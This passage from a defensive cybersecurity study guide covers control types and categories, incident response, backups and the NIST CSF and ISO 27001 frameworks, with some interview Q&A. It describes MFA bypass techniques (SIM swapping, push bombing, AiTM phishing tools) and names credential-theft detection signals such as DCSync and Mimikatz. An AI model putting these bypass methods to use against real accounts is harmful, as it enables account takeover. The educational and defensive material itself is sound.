> **A:** Qualitative uses descriptive scales (Low/Medium/High/Critical) based on expert judgment — faster but subjective. Quantitative uses financial metrics (ALE = SLE × ARO) with precise monetary values — more objective but requires historical data and is time-consuming. Most organizations use semi-quantitative (descriptive scales mapped to numbers) as a practical middle ground.

## Expert Level

**Q11: A CVSS score says 9.8 Critical. Should you drop everything and patch immediately? What other factors matter?**
> **A:** CVSS alone is insufficient for prioritization. Also consider: (1) Is the asset internet-facing? (2) Does a public exploit exist (EPSS score)? (3) Is this asset in PCI/HIPAA/regulatory scope? (4) What controls already compensate for this vulnerability? (5) Can the asset be temporarily isolated while patching is arranged? (6) Is there active exploitation in the wild (CISA KEV list)? A CVSS 9.8 on an offline test server may be lower priority than a CVSS 7.0 on an internet-facing payment processor.

**Q12: How does ransomware encrypt files, and why is recovery without the key usually impossible?**
> **A:** Modern ransomware uses hybrid encryption: a random AES-256 key is generated per-file (fast symmetric encryption of file contents), then the AES key is encrypted with the attacker's RSA-4096 public key. Only the attacker's RSA private key can decrypt the AES key, and then decrypt the file. Without the private key, breaking RSA-4096 would require more computational power than exists — making decryption mathematically infeasible. The only recovery options are: pay the ransom, restore from clean backups, or use a free decryptor if the ransomware group's private keys were leaked (rare).

**Q13: Explain the difference between preventive and detective controls, and why both are needed.**
> **A:** Preventive controls stop attacks from succeeding (firewall blocking port scans, MFA stopping credential attacks, encryption making stolen data useless). Detective controls identify attacks that have already occurred or are in progress (SIEM alerting on anomalous login, EDR detecting suspicious process behavior, IDS alerting on network scans). You need both because: (1) No preventive control is 100% effective — attackers will eventually bypass them, (2) Without detection, you don't know you've been breached, (3) The average breach goes undetected for 200 days without detective controls. Defense-in-depth requires BOTH layers.

---

# 21. Controls Full Matrix — Deterrent / Preventive / Detective / Corrective × Category

The following is the **complete master matrix** of all control types crossed with all control categories. This is your definitive reference for mapping controls to purpose.

## 21.1 DETERRENT Controls (Discourage Before Attack)

### Physical Deterrents
```
PURPOSE: Make the attacker think twice about physically approaching.

EXAMPLES:
  ┌────────────────────────────────────────────────────────────────┐
  │ Control              │ How It Deters                           │
  ├────────────────────────────────────────────────────────────────┤
  │ Security lighting    │ Eliminates concealment at night         │
  │ Visible CCTV cameras │ "You are being recorded" awareness      │
  │ Warning signs/fences │ Legal + psychological barrier           │
  │ Guard booths         │ Human presence discourages entry        │
  │ Barbed wire/spikes   │ Physical discomfort/pain deters climb   │
  │ Bollards/barriers    │ Vehicle ramming attack deterrent        │
  │ "No trespassing" sign│ Legal standing + psychological effect   │
  │ Patrol schedules     │ Unpredictable guard presence            │
  └────────────────────────────────────────────────────────────────┘

REAL EXAMPLE: Bank installs visible camera domes above ATMs.
  Effect: Card skimmer rate drops 60% at that branch.
  The deterrent effect is the VISIBILITY — even fake cameras deter some.
```

### Operational Deterrents
```
PURPOSE: Organizational practices that signal active monitoring and consequences.

EXAMPLES:
  ┌────────────────────────────────────────────────────────────────┐
  │ Control                    │ How It Deters                     │
  ├────────────────────────────────────────────────────────────────┤
  │ Published breach reports   │ Shows org takes security seriously │
  │ Bug bounty program         │ Redirects hackers to legal channel │
  │ Regular pen testing        │ Signals active hardening          │
  │ Security culture programs  │ Employees report suspicious things │
  │ Vendor assessments         │ Supply chain attackers know controls│
  │ Threat intel sharing (ISACs)│ Attackers know defenders see them  │
  └────────────────────────────────────────────────────────────────┘
```

### Administrative Deterrents
```
PURPOSE: Policies and legal/HR mechanisms that make attacks costly.

EXAMPLES:
  ┌────────────────────────────────────────────────────────────────┐
  │ Control                    │ How It Deters                     │
  ├────────────────────────────────────────────────────────────────┤
  │ Acceptable Use Policy (AUP)│ Clear consequences for misuse     │
  │ Background checks (hiring) │ Screens out bad actors upfront    │
  │ NDA / Confidentiality agmt │ Legal consequences for disclosure │
  │ Published legal prosecution│ Past cases signal enforcement     │
  │ Security awareness training│ Employees know they are monitored │
  │ Whistleblower hotlines     │ Insiders report peers             │
  └────────────────────────────────────────────────────────────────┘
```

### Technical Deterrents
```
PURPOSE: Technology signals that active security is in place.

EXAMPLES:
  ┌────────────────────────────────────────────────────────────────┐
  │ Control                    │ How It Deters                     │
  ├────────────────────────────────────────────────────────────────┤
  │ Login banners/warnings     │ "Unauthorized access is monitored"│
  │ Honeypots / Honeytokens    │ Attackers waste time on decoys    │
  │ Deception technology       │ False breadcrumbs mislead attacker│
  │ Port knocking              │ Hides real services from scanners │
  │ Rate limiting / CAPTCHAs   │ Brute force attempts costly/slow  │
  │ Tarpit (slow honeypot)     │ Slows down scanner/brute force    │
  └────────────────────────────────────────────────────────────────┘

HONEYPOT DEEP DIVE:
  A honeypot is a decoy system designed to attract, detect, and study attackers.
  
  Types:
    Low-interaction:  Simulates services (listening port, fake SSH)
                      Collects attacker IP, tools used, commands tried
                      Risk: LOW (limited actual OS exposure)
                      
    High-interaction: Full real OS, real services
                      Attacker can fully interact → deeper intelligence
                      Risk: HIGHER (real system can be pivoted from)
                      Must be ISOLATED from production network
                      
    Honeytoken:       Not a system — a fake credential, file, or document
                      "If anyone accesses this fake DB record, it's an attacker"
                      Example: API key embedded in fake config file
                      When used → immediate alert (no false positives possible)
  
  Use Cases:
    • Early warning system (attacker is in the network scanning)
    • Attacker intelligence gathering (TTPs, tools, objectives)
    • Legal evidence collection
    • Buying time (attacker distracted by honeypot = time to respond)
```

---

## 21.2 PREVENTIVE Controls (Stop the Attack from Succeeding)

### Physical Preventive
```
EXAMPLES WITH EXPLANATION:

Locks and Access Control:
  • PIN pads: "What you know" factor
  • Key card / badge readers: "What you have" factor  
  • Biometrics (fingerprint, iris, face): "What you are" factor
  • Multi-factor physical: Badge + PIN required (both needed)
  
Mantraps (Airlocks):
  Architecture:
    ┌────────┐     ┌──────────────┐     ┌────────────────┐
    │Outside │────►│  Mantrap     │────►│ Secure Area    │
    │        │     │  (1 person   │     │ (Data Center)  │
    │        │◄────│   at a time) │◄────│                │
    └────────┘     └──────────────┘     └────────────────┘
    
    • First door opens, person enters
    • First door closes and LOCKS
    • Identity verified (camera, weight sensor, badge)
    • Only then second door opens
    • If verification fails: TRAP — person locked in mantrap for guards
    
Cable Locks and Hardware Security:
  • Kensington locks on laptops (deters opportunistic theft)
  • Locking server rails (prevents drive removal without key)
  • Tamper-evident seals (detects if hardware has been opened)
  • BIOS locks (prevents booting from USB without password)
  
Faraday Cage / RF Shielding:
  • Blocks wireless signals (WiFi, cellular, RFID)
  • Used in: Secure rooms, forensic evidence storage, mobile device testing
  • Prevents remote attacks on RF-enabled devices
```

### Operational Preventive
```
EXAMPLES:

Change Management Process:
  Problem: Unauthorized changes create vulnerabilities.
  Solution: All changes must be:
    1. Requested and documented
    2. Assessed for security impact
    3. Tested in non-production first
    4. Approved by change advisory board (CAB)
    5. Implemented with rollback plan
    6. Post-change verified
    
  Prevents: Misconfigurations, accidental exposure, unauthorized backdoors

Access Provisioning/Deprovisioning:
  Provisioning: New employee access granted based on role (RBAC)
  Deprovisioning: Access IMMEDIATELY revoked when employee leaves
  
  Failure example: Ex-employee retains access 30 days after termination
  → Uses access to steal data → major breach
  
  Best practice: Same-day deprovisioning triggered by HR system
  Zero-trust principle: "Never trust, always verify" — re-authorize access regularly

Vulnerability Management Process:
  Discover (scan) → Assess (CVSS + context) → Prioritize → Remediate → Verify
  
  Without process: Vulnerabilities pile up for years
  With process: SLA-driven patching (Critical in 7 days, High in 30, etc.)

Secure Software Development Lifecycle (SSDLC):
  Security integrated at every phase:
  Requirements → Design → Develop → Test → Deploy → Operate
       ↓             ↓          ↓         ↓        ↓         ↓
  Threat model  Sec design  Sec coding  SAST/DAST  Sec review  RASP/WAF
```

### Administrative Preventive
```
Separation of Duties (SoD):
  PRINCIPLE: No single person should have enough access to commit fraud
             or cause significant harm without another person's involvement.
  
  EXAMPLES:
    ┌─────────────────────────────────────────────────────────────────┐
    │ Domain          │ Action A (Person 1) │ Action B (Person 2)     │
    ├─────────────────────────────────────────────────────────────────┤
    │ Finance         │ Create vendor       │ Approve payment         │
    │ IT              │ Write code          │ Deploy to production    │
    │ Database        │ DBA creates account │ Security approves perms │
    │ Cryptography    │ Generate key        │ Escrow/backup key       │
    │ Physical access │ Card issuance       │ Badge activation        │
    └─────────────────────────────────────────────────────────────────┘
  
  RELATED: Dual control = Two people must act simultaneously
           Two-person integrity = No single person alone in secure area

Least Privilege Principle:
  "Give users ONLY the access they need to do their specific job, 
   and NOTHING more."
  
  Example: 
  ❌ WRONG: All IT staff are Domain Admins "just in case they need it"
  ✅ RIGHT: Developer = read-only prod DB. DBA = full DB access. 
            Domain Admin = only the 2 people who specifically need it.
  
  Benefits:
  • If account is compromised, blast radius is LIMITED to that account's permissions
  • Insider threats can only steal what they have access to
  • Malware running as low-privilege user cannot install drivers

Data Classification Policy:
  LEVELS:
  ┌──────────────┬──────────────┬──────────────────────────────────────┐
  │ Level        │ Examples     │ Controls Required                    │
  ├──────────────┼──────────────┼──────────────────────────────────────┤
  │ Public       │ Website      │ No special handling                  │
  │ Internal     │ Memos, org   │ Not for external sharing             │
  │              │ charts       │                                      │
  │ Confidential │ Business     │ Encryption at rest + in transit      │
  │              │ plans, PII   │ Need-to-know access                  │
  │ Restricted   │ Trade secrets│ Strict access control, encrypt,      │
  │              │ M&A plans    │ no cloud storage, approved devices   │
  └──────────────┴──────────────┴──────────────────────────────────────┘
  
  Data must be LABELED (watermarks, document headers, metadata tags)
  so users know how to handle it.
```

### Technical Preventive
```
MFA — Multi-Factor Authentication (DEEP DIVE):
  
  Authentication Factors:
  ┌─────────────────┬────────────────────────────────────────────────┐
  │ Factor          │ Examples                                       │
  ├─────────────────┼────────────────────────────────────────────────┤
  │ Something you   │ Password, PIN, passphrase, security questions  │
  │ KNOW            │                                                │
  │ Something you   │ RSA token, authenticator app (TOTP), smart    │
  │ HAVE            │ card, hardware key (YubiKey)                   │
  │ Something you   │ Fingerprint, face scan, iris, voice, typing   │
  │ ARE             │ pattern (behavioral biometrics)                │
  │ Somewhere you   │ GPS location, IP range, network segment        │
  │ ARE (location)  │                                                │
  │ Something you   │ Typing rhythm, mouse movement, gait analysis  │
  │ DO              │ (behavioral biometrics)                        │
  └─────────────────┴────────────────────────────────────────────────┘
  
  MFA Bypass Attacks:
  1. SIM Swapping: Convince carrier to port victim's number to attacker's SIM
     → Receive SMS OTP → Account compromised
     Defense: Use app-based TOTP or hardware keys (not SMS)
     
  2. MFA Fatigue / Push Bombing:
     Attacker has stolen password → triggers MFA push notifications
     Sends 50+ notifications hoping victim clicks "Approve" out of fatigue
     Defense: Use number matching (app shows code, server asks "enter the code")
              Limit push notifications per period
              
  3. Adversary-in-the-Middle (AiTM) Phishing:
     Attacker proxies login to real site, stealing session cookies
     EvilGinx2, Modlishka tools do this at scale
     Defense: FIDO2/WebAuthn hardware keys (phishing-resistant MFA)
     
  4. SS7 Attacks: Exploit telecom protocol vulnerabilities to intercept SMS
     Defense: Don't use SMS for high-value accounts — use TOTP/hardware keys

Encryption (Preventive Control):
  What it prevents: Even if data is STOLEN, it's UNREADABLE without the key.
  
  TYPES:
  Symmetric Encryption (same key to encrypt/decrypt):
    AES-128: 128-bit key. Fast. Secure for most uses.
    AES-256: 256-bit key. Military grade. Standard for sensitive data.
    
  Asymmetric Encryption (public key encrypts, private key decrypts):
    RSA-2048: Web PKI standard. Being phased to RSA-4096.
    ECC (Elliptic Curve): Smaller keys, same security. Used in TLS 1.3.
    
  Data at rest:   Disk encryption (BitLocker, VeraCrypt, FileVault)
  Data in transit: TLS 1.2/1.3 for all network communications
  Data in use:    Confidential computing (Intel SGX, AMD SEV)
  
  KEY MANAGEMENT (often overlooked):
  Encryption is only as strong as key management:
  • Where are keys stored? (HSM = Hardware Security Module is best)
  • Who has access to keys?
  • How are keys rotated?
  • What happens if keys are lost?
  
  HSM (Hardware Security Module):
    Physical tamper-resistant device that stores and uses cryptographic keys.
    Keys NEVER leave the HSM in plaintext.
    Used by: Certificate Authorities, banks, payment processors.
    Examples: Thales Luna, AWS CloudHSM, Google Cloud HSM.
```

---

## 21.3 DETECTIVE Controls (Find the Attack)

### Physical Detective
```
CCTV Systems — Deep Dive:
  COMPONENTS:
    Cameras: IP cameras (PoE), megapixel resolution, wide dynamic range
    NVR/DVR: Network/Digital Video Recorder — stores footage
    VMS: Video Management Software — centralizes viewing, alerts
    Storage: RAID arrays, cloud backup (7-90 days retention typical)
    Analytics: Motion detection, line crossing, face recognition, license plates
    
  CAMERA TYPES:
    Dome:      Ceiling-mounted, wide angle, tamper-resistant, covert direction
    Bullet:    Long-range, outdoor, weatherproof, obvious deterrent
    PTZ:       Pan-Tilt-Zoom, operator-controlled, tracks moving subjects
    Fisheye:   360° panoramic, one camera covers an entire room
    Thermal:   Detects heat signatures — works in total darkness
    
  PLACEMENT CONSIDERATIONS:
    • Entry/exit points (primary focus)
    • Server rooms and data centers
    • Parking lots and perimeter
    • Reception/lobby
    • High-value asset areas
    • Avoid: Restrooms, changing rooms (legal/privacy)
    
  RETENTION POLICY:
    Typical: 30 days. Compliance: may require 90+ days.
    Encryption of stored footage: protects against insider viewing.
    Chain of custody: if footage is evidence, must be preserved properly.

Motion Detectors and Alarms:
  PIR (Passive Infrared): Detects heat signatures of moving bodies
  Microwave: Radar-based, penetrates walls (wider coverage)
  Dual-technology: PIR + microwave = fewer false positives
  Glass break sensors: Acoustic detection of breaking glass
  Door/window sensors: Magnetic contact — open = broken circuit = alert
  
  Integration: All sensors → Alarm Control Panel → Central Monitoring Station
               Central station calls authorities if no response from owner

Physical Audit Trails:
  • Badge reader logs: Every door entry/exit with timestamp + person
  • Visitor logs: Paper sign-in books, or electronic kiosk with ID scan
  • Delivery logs: All packages received, who received them
  • Clean desk audits: Physical inspection for exposed sensitive documents
  • Hardware inventory checks: Regular count of devices
  • Tamper seals: Detect if equipment has been opened
```

### Technical Detective

```
File Integrity Monitoring (FIM):
  CONCEPT: Create cryptographic hash of every critical file at baseline.
           Continuously monitor for ANY change to those files.
           Any modification = ALERT (even if legitimate).
  
  MONITORED FILES:
    OS level:  /etc/passwd, /etc/shadow (Linux) — user database changes
               Windows SAM, SYSTEM hive — credential database
    App level: Web server configs, application binaries
    Security:  AV signatures, firewall rule files
    
  TOOLS:
    Tripwire    — Enterprise FIM standard
    OSSEC       — Open source, includes FIM
    Wazuh       — Open source (OSSEC fork) with FIM module
    Windows:    System File Checker (sfc /scannow) — built-in FIM
    
  ATTACK DETECTION EXAMPLE:
    Attacker gains access, modifies /etc/passwd to add root-level user.
    FIM detects: /etc/passwd hash changed at 02:33am
    Alert: "Critical system file modified outside maintenance window"
    SOC investigates → finds attacker → contains incident

Network Anomaly Detection (NDR function):
  BASELINE LEARNING:
    Week 1-4:  Monitor traffic patterns, learn "normal"
    After baseline: Any deviation from normal = potential threat
    
  ANOMALY EXAMPLES:
    "This workstation normally talks to 5 internal IPs.
     Today it's scanning all 254 addresses in the subnet."
    → Detect: Internal port scan / lateral movement
    
    "This server sends 200MB/day outbound. 
     Today it sent 47GB to an IP in Eastern Europe."
    → Detect: Data exfiltration
    
    "DNS queries from this host are normally 50/day.
     Today it's 10,000+ queries to random-looking domains."
    → Detect: DNS tunneling C2 communication

Log Management and SIEM Alerting:
  KEY LOG SOURCES AND WHAT THEY DETECT:
  ┌──────────────────────┬─────────────────────────────────────────────┐
  │ Log Source           │ Key Events to Monitor                       │
  ├──────────────────────┼─────────────────────────────────────────────┤
  │ Windows Security     │ 4624 (logon), 4625 (failed logon),         │
  │ Event Log            │ 4720 (account created), 4728 (added to DA) │
  │ Active Directory     │ Kerberos errors, DCSync (4662), LDAP queries│
  │ Firewall logs        │ Blocked connections, port scan patterns     │
  │ IDS/IPS alerts       │ Signature matches, anomalies                │
  │ VPN logs             │ Off-hours access, new geo locations         │
  │ DNS logs             │ DGA domains, tunneling, unusual query volume│
  │ Web proxy            │ Malware domains, data upload to cloud       │
  │ Email gateway        │ Phishing, suspicious attachments, BEC       │
  │ EDR alerts           │ Malware detection, suspicious behavior      │
  │ Cloud audit logs     │ AWS CloudTrail, Azure AD logs               │
  └──────────────────────┴─────────────────────────────────────────────┘

User and Entity Behavior Analytics (UEBA):
  WHAT IT DOES:
    Creates behavioral baseline for EACH USER individually.
    Detects deviations that indicate compromise or insider threat.
    
  BEHAVIORAL METRICS TRACKED:
    • Typical login times (9am-6pm → login at 3am = anomaly)
    • Typical login locations (office in Dubai → login from Ukraine = anomaly)
    • Typical data access volume (reads 50 files/day → reads 10,000 = anomaly)
    • Typical application usage (uses Office, Teams → suddenly using Mimikatz)
    • Privilege usage patterns (rarely uses admin → now constant admin use)
    
  SCORING MODEL:
    Risk score calculated continuously for each user.
    Risk = deviation from baseline × sensitivity of affected data
    High risk score → analyst investigation or automated response
    
  INSIDER THREAT SCENARIO:
    Employee decides to quit and steal customer list before leaving.
    UEBA detects: Suddenly downloads 50,000 customer records
                  First time in 3 years accessing that database
                  Export to USB drive (DLP alert too)
    Risk score spikes → Immediate investigation → Caught before leaving
```

### Administrative Detective
```
Security Audits:
  INTERNAL AUDIT:
    Conducted by organization's own audit/compliance team.
    Less independent — may have reporting bias.
    Cheaper, more frequent.
    Useful for: Ongoing compliance monitoring, process checks.
    
  EXTERNAL AUDIT:
    Independent third party — credible to regulators and customers.
    Expensive but trusted.
    Required for: SOC 2 Type II, ISO 27001 certification, PCI-DSS QSA assessments.
    
  PENETRATION TESTING (special type of audit):
    Simulates real attack to find exploitable vulnerabilities.
    
    Types:
    Black Box:  Tester gets no information (simulates external attacker)
    Grey Box:   Tester gets some info (credentials, network diagrams)
    White Box:  Tester gets full info (source code, architecture docs)
    
    Scopes:
    External:       Test internet-facing assets only
    Internal:       Test from inside the network (assume breach)
    Web Application: Test specific web apps
    Social Engineering: Test people with phishing, vishing
    Red Team:       Full adversary simulation (extended, stealthy)
    Purple Team:    Red + Blue working together to improve detection

Access Reviews (User Access Review / Recertification):
  PROCESS:
    1. Generate report of all user accounts and their permissions
    2. Send to each manager: "Confirm these permissions are still needed"
    3. Manager reviews: Approve or revoke each permission
    4. IT acts on revocations immediately
    
  FREQUENCY: Quarterly for critical systems, annually for low-risk
  
  EXAMPLE FINDINGS:
    • Employee transferred to different department 6 months ago
      still has access to Finance systems (should have been revoked)
    • Contractor's account active 2 months after contract ended
    • Service account has Domain Admin rights (should be reduced)
    
  ORPHANED ACCOUNTS: Accounts with no owner (person left) — HIGH RISK
  These can be used by attackers for persistent access without detection.
```

---

## 21.4 CORRECTIVE Controls (Recover After Attack)

### Physical Corrective
```
Environmental Controls:
  Fire Suppression:
    Traditional: Water sprinklers — BAD for data centers (destroys equipment)
    Better:      Gaseous systems (FM-200, Novec 1230, CO2) — suppresses without water
    Modern:      VESDA (Very Early Smoke Detection Apparatus) + gaseous suppression
    
  Power Recovery:
    UPS (Uninterruptible Power Supply):
      Provides instant power (milliseconds) during outage
      Battery backup for 5-30 minutes
      Allows graceful shutdown or generator startup
      
    Generator:
      Diesel generator starts within 30-60 seconds
      Provides extended power (days/weeks with fuel supply)
      Data center standard: N+1 generators
      
  Hot/Cold/Warm Spares:
    Cold spare: Replacement hardware in storage (days to provision)
    Warm spare: Hardware partially configured, powered down (hours)
    Hot spare: Identical system running and ready to take over (seconds/minutes)
    
  Secure Hardware Disposal:
    When hardware is compromised or decommissioned:
    Hard drives: Degauss + physical shredding (NIST 800-88 compliant)
    SSDs:        Physical destruction (SSDs cannot be reliably wiped by software)
    Tapes:       Degauss + incineration
    Documentation: Certificate of destruction from vendor
```

### Technical Corrective
```
Backup and Recovery — The 3-2-1 Rule:

  3 copies of data
  2 different storage media types
  1 copy offsite (different geographic location)
  
  EXTENDED: 3-2-1-1-0:
    3 copies
    2 media types
    1 offsite
    1 offline / air-gapped (ransomware cannot reach it)
    0 errors (tested backups — untested backups = no backups)
  
  BACKUP TYPES:
    Full:         Complete copy of all data (large, slow, simple restore)
    Incremental:  Only changes since LAST backup (fast, complex restore)
    Differential: Changes since last FULL backup (medium speed, simpler restore)
    
  BACKUP TARGETS:
    Local backup: Fast, but destroyed in same fire/flood/ransomware
    Cloud backup: Geographically separated, scalable (AWS S3, Azure Blob)
    Tape backup:  Offline, air-gapped from network (ransomware-proof)
    
  TESTING IS MANDATORY:
    "A backup you haven't tested is not a backup — it's a hope."
    Test quarterly: Restore to test environment, verify data integrity.
    Ransomware scenario test: "Our entire environment is encrypted. 
                               How long to full restore from backup?"
    
  RTO vs RPO:
    RTO (Recovery Time Objective):  MAX acceptable downtime
                                    "We must be back in 4 hours"
    RPO (Recovery Point Objective): MAX acceptable data loss
                                    "We can lose at most 1 hour of data"
    
    Align backup frequency with RPO:
    RPO = 1 hour → backup every hour
    RPO = 24 hours → daily backup is sufficient

Incident Response Tools (Forensic):
  Memory acquisition:
    Magnet RAM Capture, WinPmem, Belkasoft RAM Capturer
    → Capture running process memory before system reboot destroys it
    → Find malware running only in memory (fileless malware)
    
  Disk imaging:
    dd (Linux), FTK Imager, Guymager
    → Bit-for-bit copy of entire disk
    → Preserve forensic evidence before any analysis
    → Work only on the COPY, never the original
    
  Log collection:
    Automated log archiving from SIEM before logs rotate/overwrite
    Volatile data collection: ARP cache, routing table, netstat, running processes
    
  Chain of Custody:
    Document every action: who, what, when, how
    Hash the evidence (SHA-256) and record hash immediately
    Secure physical storage of evidence media
    Required if prosecution is intended

Patch and Remediation:
  After a vulnerability is exploited:
  1. Contain: Isolate affected systems
  2. Eradicate: Remove malware, revoke compromised credentials
  3. Patch: Apply patches for the exploited vulnerability
  4. Verify: Confirm patch applied, vulnerability no longer present
  5. Monitor: Watch for re-exploitation or lateral movement
  
  PATCH MANAGEMENT TOOLS:
    WSUS (Windows Server Update Services): Microsoft patches
    SCCM/MECM: Full enterprise patch management
    Ansible/Puppet/Chef: Infrastructure-as-code patching
    Qualys/Tenable: Patch verification via scanning after patching

System Reimaging:
  When malware is suspected but cannot be fully identified/removed:
  NUKE AND PAVE = wipe the system completely and reinstall from known good baseline.
  
  Steps:
  1. Acquire forensic image first (preserve evidence)
  2. Preserve user data (if clean/needed)
  3. Boot from trusted external media
  4. Secure erase entire disk
  5. Reinstall OS from verified golden image
  6. Restore only needed data (verified clean)
  7. Rejoin to domain and reconfigure
  
  When to reimage vs clean:
  REIMAGE when: Rootkit suspected, kernel-level malware, deep registry infection
  CLEAN when:   Single known malware, fully removed, no indication of further compromise
```

### Administrative Corrective
```
Incident Response Plan (IRP):
  A documented, tested set of procedures for responding to security incidents.
  
  PHASES (NIST SP 800-61):
  ┌──────────────────────────────────────────────────────────────────┐
  │ 1. PREPARATION                                                   │
  │    • Build IR team (CSIRT/CIRT)                                 │
  │    • Document procedures, contact lists, escalation paths        │
  │    • Deploy tools (EDR, SIEM, forensic toolkit)                 │
  │    • Train and exercise (tabletop exercises)                     │
  │    • Establish communication channels and legal contacts         │
  ├──────────────────────────────────────────────────────────────────┤
  │ 2. DETECTION & ANALYSIS                                          │
  │    • Identify that an incident is occurring                      │
  │    • Determine scope and severity                                │
  │    • Classify incident type (malware, data breach, DDoS, etc.)  │
  │    • Collect and preserve evidence                               │
  │    • Notify appropriate stakeholders                             │
  ├──────────────────────────────────────────────────────────────────┤
  │ 3. CONTAINMENT                                                   │
  │    Short-term: Isolate affected systems immediately              │
  │    Long-term:  Maintain systems in controlled state for forensics│
  │    Balance:    Stop spread vs. preserve evidence                 │
  │    Example:    Isolate infected host via EDR while imaging disk  │
  ├──────────────────────────────────────────────────────────────────┤
  │ 4. ERADICATION                                                   │
  │    • Remove malware (or reimage)                                │
  │    • Identify root cause (HOW did they get in?)                 │
  │    • Remove attacker persistence mechanisms                      │
  │    • Change all compromised credentials                          │
  │    • Patch the exploited vulnerability                           │
  ├──────────────────────────────────────────────────────────────────┤
  │ 5. RECOVERY                                                      │
  │    • Restore systems from clean backup                           │
  │    • Reconnect to network (gradually, with monitoring)           │
  │    • Test functionality                                          │
  │    • Monitor intensely for re-infection                          │
  ├──────────────────────────────────────────────────────────────────┤
  │ 6. POST-INCIDENT ACTIVITY (Lessons Learned)                      │
  │    • Hold lessons-learned meeting within 1-2 weeks               │
  │    • Document: What happened? Timeline? Impact? Response quality?│
  │    • Identify: What controls failed? What worked? What gaps?     │
  │    • Update: IRP, detection rules, training based on findings    │
  │    • Report: Regulatory notification if required (GDPR 72 hours) │
  └──────────────────────────────────────────────────────────────────┘

Business Continuity Plan (BCP):
  Ensures critical business functions continue during and after a disaster.
  Broader than IRP — covers ALL disruptions (not just cyber).
  
  Key Elements:
  • BIA (Business Impact Analysis): Which processes are most critical?
  • Recovery priorities: Which systems must be restored first?
  • Alternate work arrangements: Remote work, alternate sites
  • Communication plan: How to notify employees, customers, media
  • Supply chain continuity: Alternate vendors if primary affected

Disaster Recovery Plan (DRP):
  Focuses specifically on IT system recovery after major disruption.
  
  DR SITE TYPES:
    Cold site:  Empty facility, no equipment. Cheap. Slow recovery (days-weeks).
    Warm site:  Facility with equipment, not current data. Hours-days to activate.
    Hot site:   Full mirror of production, continuously synced. Minutes to activate. Expensive.
    Cloud DR:   Use cloud provider as DR site (AWS, Azure). Pay only when needed.
    
  METRICS:
    RTO: How fast must we recover? (4 hours? 24 hours? 72 hours?)
    RPO: How much data can we lose? (0? 1 hour? 24 hours?)
    
  DR TESTING:
    Tabletop exercise:     Discussion only — "What would we do if...?"
    Walkthrough:          Step through the plan on paper
    Simulation:           Test components without actual failover
    Full interruption test: Actually fail over to DR site (most thorough, highest risk)
    Parallel test:        Run DR site alongside production (no interruption, but expensive)

Root Cause Analysis (RCA):
  GOAL: Find the UNDERLYING CAUSE, not just the symptom.
  
  5 WHYS TECHNIQUE:
    Problem: Web server was compromised.
    Why 1: Because it had an unpatched vulnerability (CVE-2021-12345).
    Why 2: Because it hadn't been patched in 8 months.
    Why 3: Because the patch management system didn't include web servers.
    Why 4: Because web servers were managed by a different team.
    Why 5: Because there's no unified patch management policy.
    
    ROOT CAUSE: No unified patch management policy covering all systems.
    FIX: Implement policy covering ALL systems, not just "IT-managed" ones.
    
    Just patching the one server (fixing symptom) = missing the point.
    Fixing the policy (root cause) = prevents recurrence across all servers.

Cyber Insurance:
  WHAT IT COVERS (typical policy):
    ✅ Breach response costs (forensic investigators, notification letters)
    ✅ Legal fees and regulatory fines
    ✅ Business interruption (revenue lost while systems offline)
    ✅ Ransom payments (if organization chooses to pay)
    ✅ PR and crisis management
    ✅ Customer notification and credit monitoring services
    
  WHAT IT DOES NOT COVER:
    ❌ Reputational damage (customer trust loss)
    ❌ Regulatory accountability (still YOUR responsibility)
    ❌ Nation-state attacks (most policies have "acts of war" exclusion)
    ❌ Insider fraud (separate crime policy needed)
    
  PREMIUM FACTORS:
    • Revenue and size of organization
    • Industry sector (healthcare, finance = higher risk = higher premium)
    • Security controls in place (MFA, EDR, backups = lower premium)
    • History of past incidents
    • Coverage limits and deductible chosen
    
  TREND: Premiums have skyrocketed since 2020 ransomware explosion.
         Insurers now REQUIRE: MFA, EDR, tested backups, IR plan.
         Failure to maintain these = claim denial.
```

---

# 22. Security Frameworks — The Standards Map

Security frameworks provide structured guidance for building and maintaining security programs. Organizations use them to benchmark maturity, meet compliance, and communicate security posture.

## 22.1 NIST Cybersecurity Framework (NIST CSF)

```
OVERVIEW:
  Published by: US National Institute of Standards and Technology (NIST)
  Version: 2.0 (2024) — also widely used v1.1
  Audience: All organizations, all sectors
  Approach: Risk-based, flexible, outcome-focused
  
THE CSF CORE — 5 FUNCTIONS:

  ┌──────────┬──────────┬──────────┬──────────┬──────────┐
  │ IDENTIFY │ PROTECT  │  DETECT  │  RESPOND │ RECOVER  │
  │    (ID)  │   (PR)   │   (DE)   │   (RS)   │   (RC)   │
  └──────────┴──────────┴──────────┴──────────┴──────────┘
  
  IDENTIFY: Understand assets, risks, and organizational context.
    Categories: Asset Management, Business Environment, Governance,
               Risk Assessment, Risk Management Strategy
    Example activities: Asset inventory, risk assessment, supplier mapping
    
  PROTECT: Implement safeguards.
    Categories: Access Control, Awareness/Training, Data Security,
               Info Protection Processes, Maintenance, Protective Technology
    Example activities: MFA deployment, encryption, patch management
    
  DETECT: Implement monitoring to identify incidents.
    Categories: Anomalies & Events, Security Monitoring, Detection Processes
    Example activities: SIEM deployment, IDS/IPS, log monitoring
    
  RESPOND: Take action after detecting an incident.
    Categories: Response Planning, Communications, Analysis, Mitigation,
               Improvements
    Example activities: Incident response execution, stakeholder notification
    
  RECOVER: Restore capabilities and services.
    Categories: Recovery Planning, Improvements, Communications
    Example activities: System restoration, lessons learned, business continuity

CSF PROFILES:
  Current Profile: Where you ARE now
  Target Profile:  Where you WANT to be
  Gap = work to be done

CSF TIERS (Maturity Levels):
  Tier 1 - Partial:    Ad hoc, reactive, minimal risk awareness
  Tier 2 - Risk Informed: Risk-aware but not formalized
  Tier 3 - Repeatable: Formalized, consistent processes
  Tier 4 - Adaptive:   Continuously improving, threat-informed
```

## 22.2 ISO/IEC 27001 — Information Security Management System

```
OVERVIEW:
  Published by: International Organization for Standardization (ISO)
  Standard: ISO/IEC 27001:2022 (latest version)
  Purpose: Establish, implement, maintain, and improve an ISMS
  Certification: Organizations can be formally CERTIFIED (audited by accredited body)
  
STRUCTURE:
  ISO 27001 has 11 clauses (4-10 are normative requirements):
  Clause 4:  Context of the organization
  Clause 5:  Leadership
  Clause 6:  Planning (risk assessment, risk treatment)
  Clause 7:  Support (resources, competence, communication)
  Clause 8:  Operation (risk treatment implementation)
  Clause 9:  Performance evaluation (monitoring, audits)
  Clause 10: Improvement (nonconformities, continual improvement)
  
ANNEX A — 93 CONTROLS (ISO 27001:2022):
  Organized into 4 themes:
  
  Organizational Controls (37):
    Policies, roles, threat intelligence, supply chain, incident management...
    
  People Controls (8):
    Screening, security awareness, remote working, disciplinary process...
    
